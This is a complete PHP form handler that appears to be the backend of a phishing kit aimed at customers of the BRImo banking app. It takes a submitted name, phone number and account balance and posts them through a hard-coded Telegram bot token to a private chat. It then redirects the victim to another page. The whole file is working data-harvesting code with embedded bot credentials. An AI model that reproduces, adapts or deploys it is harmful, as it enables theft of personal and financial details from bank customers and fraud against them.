<?php
$nama  = $_POST['nama'] ?? '';
$nomor = $_POST['nomor'] ?? '';
$saldo = $_POST['saldo'] ?? '';

$botToken = '7633884429:AAGzLoN3NukJqC_nkMviol9X81aKMjHRZDA';
$chatId   = '7680148723';

$message = "𝗢𝗥𝗗𝗘𝗥 𝗕𝗥𝗜𝗠𝗢 || $nama\n\n"
         . "Nama: $nama\n"
         . "Nomor: $nomor\n"
         . "Sisa Saldo: $saldo";

$url = "https://api.telegram.org/bot$botToken/sendMessage";

$data = [
    'chat_id' => $chatId,
    'text'    => $message
];

$options = [
    'http' => [
        'header'  => "Content-Type: application/x-www-form-urlencoded\r\n",
        'method'  => 'POST',
        'content' => http_build_query($data)
    ]
];

$context = stream_context_create($options);
$result = file_get_contents($url, false, $context);

header("Location: tree.html");
exit;
?>
